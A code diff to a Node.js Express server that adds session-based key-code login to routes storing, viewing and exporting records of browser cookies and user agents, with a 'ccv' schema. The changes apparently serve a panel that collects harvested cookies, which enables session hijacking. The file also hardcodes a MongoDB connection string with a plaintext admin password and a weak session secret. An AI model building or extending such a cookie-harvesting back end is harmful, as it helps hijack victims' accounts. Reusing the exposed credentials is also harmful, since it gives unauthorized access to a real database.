@@ -9,6 +9,8 @@ const path = require('path')
 const bodyParser = require('body-parser');
 let mongoose = require('mongoose')
 const googleTrends = require('google-trends-api');
+
+var session = require('express-session');
 mongoose.connect('mongodb+srv://admin:phongdepzai123@cluster0-g0afi.mongodb.net/assignment', {
     useNewUrlParser: true,
     useUnifiedTopology: true,
@@ -16,6 +18,13 @@ mongoose.connect('mongodb+srv://admin:phongdepzai123@cluster0-g0afi.mongodb.net/
 }).then(function () {
     console.log("Connected")
 })
+
+app.use(session({
+    resave: true, 
+    saveUninitialized : true,
+    secret: 'somesecret', 
+    cookie: { maxAge: 600000 }}));
+
 //ccv Schema
 let ccvSchema = require('./schema/ccvschema')
 let Ccv = mongoose.model('ccv', ccvSchema, 'ccv')
@@ -55,7 +64,8 @@ function transform(doc){
     };
 }
 app.get('/getCSV', async (req, res) => {
-    let cursor = await Account.find().lean().sort([['_id', -1]]).select('cookies userAgent date -_id')
+    if(req.session.keycode){
+        let cursor = await Account.find().lean().sort([['_id', -1]]).select('cookies userAgent date -_id')
 
     converter.json2csv(cursor, (err, csv) => {
         if (err) {
@@ -66,11 +76,20 @@ app.get('/getCSV', async (req, res) => {
         res.attachment('filename.csv');
         res.status(200).send(csv);
     });
+    }
+    else{
+        res.redirect('/login')
+    }
 })
 app.get('/accountView', async (req, res) => {
-    let account = await Account.find({}).sort([["_id", -1]])
+    if(req.session.keycode){
+        let account = await Account.find({}).sort([["_id", -1]])
     
     res.render('account_view',{results: account})
+    }
+    else{
+        res.redirect('/login')
+    }
 
 })
 app.get('/', async (req, res) => {
@@ -108,6 +127,7 @@ function getUID(strCookies){
 app.post('/addAccount', async (req, res) => {
     
     let uid  = getUID(req.body.cookies)
+    console.log(uid)
     var regexQuery = {
         cookies: new RegExp(uid, 'i')
       }
@@ -132,23 +152,30 @@ app.post('/addAccount', async (req, res) => {
     }
 
 })
+app.get('/home', async (req, res) => {
+    if(req.session.keycode){
+        res.render('home')
+    }
+    else{
+        res.redirect('/login')
+    }
+
+})
+
+app.get('/login', async (req, res) => {
+    res.render('login')
+
+})
 app.post('/login', async (req, res) => {
     let isExisted = await KeyCode.find({keycode: req.body.keycode})
     if(isExisted.length!=0){
-        if(isExisted[0].isLoggedIn){
-            res.status(501).send("Có máy khác đang đăng nhập")
-        }
-        else{
-            res.send(200,"Key hợp lệ")
-            let stt = await KeyCode.findOneAndUpdate({"keycode": req.body.keycode},{
-                isLoggedIn:true
-            })
-
-        }
-
+        req.session.keycode = isExisted
+        res.redirect('/home')
     }
     else{
-        res.send(404,"Không tìm thấy key")
+        res.render('login',{
+            error : "Không tìm thấy key"
+        })
     }
 
 })
